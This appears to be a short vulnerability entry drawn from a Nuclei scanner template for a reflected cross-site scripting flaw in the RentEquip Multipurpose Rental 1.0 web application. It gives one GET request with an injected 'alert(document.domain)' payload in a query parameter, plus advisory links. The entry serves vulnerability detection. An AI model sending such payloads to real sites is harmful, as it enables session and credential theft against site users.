# Nuclei Template: RentEquip Multipurpose Rental 1.0 - Cross Site Scripting
**Template ID:** rentequip-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`rentequip-xss.yaml`)

## Vulnerability Information & PoC

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/shop/products?category=cordless-tools&min=1026553%3balert(document.domain)%2f%2f772
```

## References
- https://vulners.com/packetstorm/PACKETSTORM:173002
- https://www.exploitalert.com/view-details.html?id=39611
- https://codecanyon.net/user/kreativdev/portfolio
